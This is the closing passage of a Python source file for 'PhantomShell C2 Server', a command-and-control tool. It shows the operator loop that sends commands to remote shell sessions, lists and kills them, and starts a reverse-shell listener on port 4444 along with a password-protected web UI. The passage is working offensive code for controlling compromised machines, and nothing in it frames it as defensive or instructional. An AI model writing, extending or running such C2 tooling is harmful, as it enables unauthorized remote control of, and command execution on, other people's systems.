                    except (EOFError, KeyboardInterrupt):
                        break
                    if icmd.lower() == "back":
                        break
                    if icmd:
                        out = sess.send(icmd)
                        print(f"{C['g']}{out}{C['R']}\n")
            except ValueError:
                print(f"  {ERR} invalid session id")

        elif cmd == "exec" and len(parts) >= 3:
            try:
                sid  = int(parts[1])
                icmd = parts[2]
                sess = SM.get(sid)
                if not sess:
                    print(f"  {ERR} session not found"); continue
                out = sess.send(icmd)
                print(f"{C['g']}{out}{C['R']}")
            except ValueError:
                print(f"  {ERR} invalid session id")

        elif cmd == "kill" and len(parts) >= 2:
            try:
                sid  = int(parts[1])
                sess = SM.get(sid)
                if sess:
                    sess.alive = False
                    print(f"  {OK} session {sid} marked dead")
            except ValueError:
                pass

        elif cmd == "prune":
            SM.prune()
            print(f"  {OK} dead sessions removed")

        elif cmd in ("exit", "quit"):
            print(f"\n{ERR} Shutting down C2...\n")
            os._exit(0)

        else:
            print(f"  {C['d']}unknown command — type 'help'{C['R']}")


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def get_args():
    p = argparse.ArgumentParser(
        prog=f"python3 {sys.argv[0]}",
        description="PhantomShell C2 Server",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--host",      default="0.0.0.0",       help="Bind address (default: 0.0.0.0)")
    p.add_argument("--port",      type=int, default=4444,  help="Shell listener port (default: 4444)")
    p.add_argument("--web-port",  type=int, default=8080,  help="Web UI port (default: 8080)")
    p.add_argument("--password",  default="phantomshell",  help="Web UI password (default: phantomshell)")
    p.add_argument("--no-cli",    action="store_true",     help="Disable interactive CLI")
    p.add_argument("--no-banner", action="store_true")
    return p.parse_args()


def main():
    args = get_args()

    global WEB_PASSWORD
    WEB_PASSWORD = args.password

    signal.signal(signal.SIGINT, lambda s, f: (print(f"\n{ERR} Shutting down..."), os._exit(0)))

    if not args.no_banner:
        banner()

    log(f"PhantomShell C2 v{VERSION} starting...", "star")
    log(f"Shell listener : {args.host}:{args.port}", "info")
    log(f"Web UI         : http://{args.host}:{args.web_port}", "info")
    log(f"Password       : {args.password}", "info")
    print()

    # Start shell listener thread
    t1 = threading.Thread(target=shell_listener, args=(args.host, args.port), daemon=True)
    t1.start()

    # Start web server thread
    t2 = threading.Thread(target=web_server, args=(args.host, args.web_port), daemon=True)
    t2.start()

    # CLI runs in main thread (or skip with --no-cli)
    if not args.no_cli:
        cli_loop()
    else:
        t1.join()


if __name__ == "__main__":
    main()
